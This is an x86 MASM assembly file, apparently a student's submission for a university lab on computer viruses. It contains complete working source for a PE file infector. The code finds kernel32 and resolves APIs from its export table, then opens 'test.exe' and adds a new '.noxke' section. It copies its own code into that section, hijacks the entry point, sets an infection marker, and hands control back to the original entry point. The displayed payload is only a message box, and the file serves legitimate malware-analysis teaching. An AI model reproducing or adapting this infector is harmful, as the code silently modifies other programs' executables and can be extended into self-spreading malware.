;UID:U202100000:
;Flag:4ee4c9:
;Name:noxke
;Date:2023年12月23日  
;FileName:task7.asm
;Other comments： 
.586
.model flat,stdcall
option casemap:none
include c:\masm32\include\windows.inc
include c:\masm32\include\comctl32.inc
includelib c:\masm32\lib\comctl32.lib

GetApiA proto:DWORD,:DWORD
.CODE
VirusLen=vEnd-vBegin  	;病毒长度
vBegin:
_Start0:
    ;invoke InitCommonControls
    jmp _Start

K32_api_ordinal_retrieve proc Base:DWORD,sApi:DWORD   ;****从kernel32.dll中查找函数序号****
; ****** Your code 3 begin task6-2******
    ;保存现场
    push ebx
    push ecx
    push edx
    push esi
    push edi
    ;取参数到寄存器中	
    ;edi=AddressOfNames
    ;ecx=NumberOfNames
    ;edx=AddressOfNameOrdinals
    add edx, dword ptr [Base]
    push edx
    push ecx
    mov edi, esi
    add edi, dword ptr [Base]
    push edi
    ;esi=sApi
    mov esi, dword ptr [sApi]
    xor eax, eax
    xor ebx, ebx
    xor edx, edx
loop1:
    mov edi, dword ptr [esp]
    mov edi, dword ptr [edi+eax*4]
    add edi, dword ptr [Base]
    xor ecx, ecx
loop2:
    mov bl, byte ptr [esi+ecx]
    mov dl, byte ptr [edi+ecx]
    inc ecx
    cmp bl, dl
    jne loop2_end
    test bl, bl
    jz loop1_end
    jmp loop2
loop2_end:
    inc eax
    cmp eax, dword ptr [esp+4]
    jl loop1
    int 3  ;未找到 发生错误
loop1_end:
    pop edi
    pop ecx
    pop edx
    ;准备循环条件
    ;根据名字，找出序数,存入eax
    mov eax, dword ptr [edx+eax*2]
    and eax, 0ffffh
    pop edi
    pop esi
    pop edx
    pop ecx
    pop ebx
; ****** Your code 3 end ******
    ret
K32_api_ordinal_retrieve endp

GetApiA proc Base:DWORD,sApi:DWORD   ;已知DLL Base 及API函数名，查找该DLL的多个API地址*****
    local ADDRofFun:DWORD
    ;******  Your code 2 begin task6-1******
    ;保存现场
    push ebx
    push ecx
    push edx
    push esi
    push edi
    ;指针指向DLL基址
    mov ebx, dword ptr [Base]
    ;利用PE文件偏移，找到可选文件头的导出函数表地址
    mov eax, dword ptr [ebx+IMAGE_DOS_HEADER.e_lfanew]  ;PE头
    add eax, IMAGE_NT_HEADERS.OptionalHeader    ;OptionalHeader头
    add eax, IMAGE_OPTIONAL_HEADER32.DataDirectory
    mov eax, dword ptr [ebx+eax]    ;导出表va
    add ebx, eax

    ;ecx=NumberOfNames
    mov ecx, dword ptr [ebx+IMAGE_EXPORT_DIRECTORY.NumberOfNames]
    ;edx=AddressOfNameOrdinals
    mov edx, dword ptr [ebx+IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
    ;esi=AddressOfNames
    mov esi, dword ptr [ebx+IMAGE_EXPORT_DIRECTORY.AddressOfNames]
    
    invoke K32_api_ordinal_retrieve,Base,sApi	;获得sApi的序号ordinal，存入eax
    ;根据序号获得Api rva地址
    ;edx=AddressOfFunctions
    ;找到导出函数地址的首部AddressOfFunctions
    mov edx, dword ptr [ebx+IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
    add edx, dword ptr [Base]
    mov eax, dword ptr [edx+eax*4]
    ;+ImageBase后获得api VA地址
    add eax, dword ptr [Base]
    ;eax返回api地址
    ;恢复现场
    pop edi
    pop esi
    pop edx
    pop ecx
    pop ebx
    ; ****** Your code 2 end ******
    ret
GetApiA endp

u32 db "User32.dll",0
k32 db "Kernel32.dll",0
appBase dd ?
k32Base dd ?
;********Task 7-1 获取其他API Get More Api and save these address Task 7-1********
lpApiAddrs label near
    dd offset sGetProcAddress
    dd offset sLoadLibrary
    dd offset sGetModuleHandle
    dd offset sCreateFile
    dd offset sCreateFileMapping
    dd offset sMapViewOfFile
    dd offset sUnmapViewOfFile
    dd offset sCloseHandle
    dd offset sGetFileSize
    dd offset sSetEndOfFile
    dd offset sSetFilePointer
    dd offset sExitProcess
    dd 0,0

sGetProcAddress db "GetProcAddress",0
sLoadLibrary db "LoadLibraryA",0
sGetModuleHandle db "GetModuleHandleA",0
sCreateFile db "CreateFileA",0
sCreateFileMapping db "CreateFileMappingA",0
sMapViewOfFile db "MapViewOfFile",0
sUnmapViewOfFile db "UnmapViewOfFile",0
sCloseHandle db "CloseHandle",0
sGetFileSize db "GetFileSize",0
sSetEndOfFile db "SetEndOfFile",0
sSetFilePointer db "SetFilePointer",0
sExitProcess db "ExitProcess",0


aGetProcAddress dd 0
aLoadLibrary dd 0
aGetModuleHandle dd 0
aCreateFile dd 0
aCreateFileMapping dd 0
aMapViewOfFile dd 0
aUnmapViewOfFile dd 0
aCloseHandle dd 0
aGetFileSize dd 0
aSetEndOfFile dd 0
aSetFilePointer dd 0
aExitProcess dd 0
;********Task 7-1 获取其他API end Get More Api and save these address Task 7-1********

;********Task 7-2 感染用数据结构 Begin infect host file test.exe and map the file into the memory， data sturuct********
hostfile db "test.exe",0
fsize dd ?
hFile dd ?
hMap  dd ?
pMem  dd ?
pe_Header dd ?
sec_Header dd ?
sec_Num dd ?
virus_sec_p dd ?    ;病毒节区文件偏移
virus_sec_size dd ? ;病毒节区大小
sec_align dd ?     		;内存中节对齐粒度
file_align dd ?			 ;文件中节对齐粒度
newEip dd ?				;新程序入口点地址
oldEip dd ?				;原程序入口点地址
oldEipTemp dd ?
inc_size dd ?
oldEnd dd ?				;病毒代码在Host文件中的写入点
;
sMessageBoxA db "MessageBoxA",0
aMessageBoxA dd 0
;Put Your name and UID here
szName db "noxke",0
szUID db "UID U202100000",0dh,0ah,"VirusLen:"
val dd 0,0,0,0
;********Task 7-2 感染用数据结构 End infect host file test.exe and map the file into the memory， data sturuct********

;******病毒入口********

_Start:
    call _delta
_delta:
    pop ebp
    sub ebp,offset _delta
    mov dword ptr[ebp+appBase],ebp
    ; ******* Your code 1 begin task 5******
    ;-----获取Kerenel32.dll模块地址
    mov eax,[esp]    ;from stack
    and eax, 0ffff0000h
    add eax, 10000h
    xor edx,edx
getK32Base:
    sub eax, 10000h
    mov edx,dword ptr[eax+IMAGE_DOS_HEADER.e_lfanew]    ;3ch
    cmp edx,0f8h                                ;check f8
    jnz getK32Base
    cmp eax,dword ptr[eax+edx+IMAGE_NT_HEADERS.OptionalHeader.ImageBase] ;double check ImageBase value with eax
    jnz getK32Base
    mov [ebp+k32Base],eax                ;save ImageBase into k32Base
    ;-----save ImageBase into k32Base
    ; *******   Your code 1 end ******
    lea edi,[ebp+aGetProcAddress]
    lea esi,[ebp+lpApiAddrs]
lop_get:
    lodsd
    cmp eax,0
    jz End_Get
    add eax,ebp
    push eax
    push dword ptr[ebp+k32Base]
    call GetApiA     ;******* Task 7-1 get more api and save the address
    stosd			;eax存入edi指向地址
    jmp lop_get
End_Get:
    call my_infect 	; 进行感染
    
    ;*******Task7-3 Your Code Begin 感染后，显示代码长度VirusLen、作者信息*******

    lea eax, [ebp+u32]
    push eax
    call dword ptr [ebp+aLoadLibrary]    ;加载User32.dll
    mov [ebp+appBase], eax
    lea eax, [ebp+sMessageBoxA]
    push eax
    mov eax, dword ptr [ebp+appBase]
    push eax
    call [ebp+aGetProcAddress]
    mov [ebp+aMessageBoxA], eax
    ;get VirusLen     ;save VirusLenth into val
    mov eax, VirusLen
    call saveEax
    push 40h+1000h
    lea eax,[ebp+szName]
    push eax
    lea eax,[ebp+szUID]
    push eax
    push 0
    call [ebp+aMessageBoxA]
    ; exit
    ; push 0
    ; call [ebp+aExitProcess]
    ;********Task7-3 Your Code end 显示代码长度VirusLen、作者信息*******

    jmp _where

binToAscii proc near	; change al into Ascii
    push eax
    and eax,0fh
    add al,30h
    cmp al,39h
    jbe @f
    add al,7
@@:
    stosb   ;save ax into [edi]
    pop eax
    ret
binToAscii endp

saveEax proc near   ;save eax to val in Ascii mode
    push ecx
    push edi
    push eax
    
    mov ecx,8
    cld
    lea edi,[ebp+val]
L1:	
    rol eax,4
    call binToAscii
    loop L1
    
    pop eax
    pop edi
    pop ecx
    ret
saveEax endp


CouldNotInfect:
_where:
    xor eax,eax
    push eax
    call [ebp+aGetModuleHandle]		;获得virus启动程序或者Host程序的首地址，存入eax
    mov esi,eax				
    add esi,[esi+3ch]     			;esi->Host PE_Header
    cmp dword ptr[esi+8],'flag'		;判断是已经在运行的Host程序，还是Virus启动程序
    je jmp_oep						;******是Host程序，则控制权交给Host
    jmp _xit
jmp_oep:
    add eax,[ebp+oldEip]			;******找到Host原始入口地址并跳转
    jmp eax

;*******进行感染*******	
my_infect:
    xor eax,eax
    push eax
    push eax
    push OPEN_EXISTING
    push eax
    push eax
    push GENERIC_READ+GENERIC_WRITE
    lea eax,[ebp+hostfile]
    push eax
    call [ebp+aCreateFile]
    inc eax
    je _Err
    dec eax
    mov [ebp+hFile],eax
    push eax
    sub ebx,ebx
    push ebx
    push eax
    call [ebp+aGetFileSize]
    inc eax
    je _sclosefile
    dec eax
    mov [ebp+fsize],eax
    xchg eax,ecx
    add ecx,1000h
    pop eax
    xor ebx,ebx
    push ebx
    push ecx
    push ebx
    push PAGE_READWRITE
    push ebx
    push eax
    call [ebp+aCreateFileMapping]
    test eax,eax
    je _sclosefile				;失败则关闭文件
    mov [ebp+hMap],eax
    xor ebx,ebx
    push ebx
    push ebx
    push ebx
    push FILE_MAP_WRITE
    push eax
    call [ebp+aMapViewOfFile]
    test eax,eax
    je _sclosefile				;失败则关闭文件
    mov [ebp+pMem],eax			
    
    ;********Task 7-2 Your Code Being 感染Host文件Infect the Host PE file*******
    xchg eax,esi
    ;Check MZ,PE signature
    cmp word ptr [esi], 'ZM'
    jne CouldNotInfect
    add esi,[esi+3ch]   ;指向pe_Header
    mov [ebp+pe_Header], esi
    cmp word ptr [esi], 'EP'
    jne CouldNotInfect
    cmp dword ptr [esi+8], 'flag'
    je CouldNotInfect
    ;设置flag
    mov ecx, 'flag'
    mov [esi+8], ecx
    ;得到data directory的数目
    ;eax指向节表起始地址
    mov eax, dword ptr [esi+14h]    ;SizeOfOptionalHeader
    and eax, 0ffffh
    lea eax, [esi+eax+18h]    ;SectionHeaders
    mov [ebp+sec_Header], eax
    ;ecx得到节数量
    mov ecx, dword ptr [esi+6]  ;NumberOfSections
    and ecx, 0ffffh
    mov [ebp+sec_Num], ecx
    ;得到所有节表的大小
    ;找到节尾部
@@1:
    add eax, 28h
    loop @@1
    ;eax 指向pe_Header, esi指向最后节节表开始偏移处
    xchg eax, esi
    ;增加节名为自己姓名缩写，填节实际大小section name .hum
    mov dword ptr [esi], 'xon.'
    mov dword ptr [esi+4], 'ek'
    ;节对齐，文件对齐
    mov ecx, dword ptr [eax+38h]    ;SectionAlignment
    mov [ebp+sec_align], ecx
    ;取上一节地址及实际大小
    ;计算新节的RVA偏移位置
    mov ebx, [esi-18h]  ;SizeOfRawData
    xor ecx, ecx
@@2:
    add ecx, [ebp+sec_align]
    cmp ecx, ebx
    jl @@2
    add ecx, [esi-1ch]  ;rva
    mov [esi+0ch], ecx  ;rva
    ;计算新入口点地址并保存
    mov ebx, [eax+28h]
    mov [ebp+oldEip], ebx
    mov [ebp+newEip], ecx
    mov [eax+28h], ecx  ;EP
    ;计算本节的文件对齐
    ;保存节对齐文件后的大小
    mov ecx, dword ptr [eax+3ch]    ;FileAlignment
    mov [ebp+file_align], ecx
    mov ebx, VirusLen
    xor ecx, ecx
@@3:
    add ecx, [ebp+file_align]
    cmp ecx, ebx
    jl @@3
    mov [esi+10h], ecx  ;文件对齐
    mov [ebp+virus_sec_size], ecx
    ;更新PointerToRawData
    mov ecx, [esi-14h]  ;PointerToRawData
    add ecx, [esi-18h]  ;SizeOfRawData
    mov [esi+14h], ecx
    mov [ebp+virus_sec_p], ecx
    ;设置节属性0E0000020h
    mov ecx, 0E0000020h
    mov [esi+24h], ecx   ;Characteristics
    ;更新节数目
    mov ecx, [ebp+sec_Num]
    inc ecx
    mov word ptr [eax+6], cx
    ;更新ImageSize=原ImageSize+病毒长度 并对齐后的长度
    mov ebx, [ebp+virus_sec_size]
    xor ecx, ecx
@@4:
    add ecx, [ebp+sec_align]
    cmp ecx, ebx
    jl @@4
    add ecx, dword ptr [eax+50h]
    mov [eax+50h], ecx
    ;将病毒代码写入新节
    mov ecx, [ebp+virus_sec_size]
    mov edi, [ebp+pMem]
    add edi, [ebp+virus_sec_p]
    lea esi, [ebp+vBegin]
    rep movsb

;*******Task 7-2,Your Code End *******		


;*******感染后，关闭文件**********	
_sunview:
    push [ebp+pMem]
    call [ebp+aUnmapViewOfFile]
_sclosemap:
    push [ebp+hMap]
    call [ebp+aCloseHandle]
_sclosefile:
    push [ebp+hFile]
    call [ebp+aCloseHandle]
_Err:
    ret
_xit:
    push 0
    call [ebp+aExitProcess]      ;******调用退出ExitProcess******
vEnd:
    end _Start0
